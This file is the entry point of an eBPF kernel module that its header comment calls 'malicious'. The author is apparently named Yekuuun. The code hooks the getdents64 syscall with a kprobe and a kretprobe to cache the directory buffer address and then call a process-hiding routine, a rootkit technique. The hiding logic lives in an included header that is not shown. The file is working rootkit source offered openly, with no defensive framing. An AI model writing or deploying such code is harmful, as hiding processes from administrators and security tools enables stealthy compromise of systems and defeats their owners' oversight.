/**
 * Main entry point for the kernel ebpf malicious module.
 * 
 * @author Yekuuun
 */

#include "./includes/bpf.h"
#include "./includes/maps.h"
#include "./includes/config.h"

//modules
#include "./modules/mod_hide_proc.h"

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  HIDE PROCESS
// └────────────────────────────────────┘
//----------------------------------------------------

/**
 * kprobe — saves dirp userspace address while syscall args are valid.
 *
 * @note => dirp is empty at this point, kernel has not filled it yet. we only save its address for use in kretprobe.
 */
SEC("kprobe/__x64_sys_getdents64")
int BPF_KPROBE(kprobe_hide_pid, struct pt_regs *regs)
{
    __u32 key  = 0;
    __u64 addr = PT_REGS_PARM2_CORE(regs);

    bpf_map_update_elem(&hide_proc_dirp_cache, &key, &addr, BPF_ANY);
    return 0;
}

/**
 * kretprobe for __x64_sys_getdents (exit => handle data saved by kprobe_hide_pid)
 */
SEC("kretprobe/__x64_sys_getdents64")
int BPF_KRETPROBE(kretprobe_hide_pid, long ret)
{
    return attach_proc_hide(ret);
}

//-----------------------------------------------------


char LICENSE[] SEC("license") = "GPL";
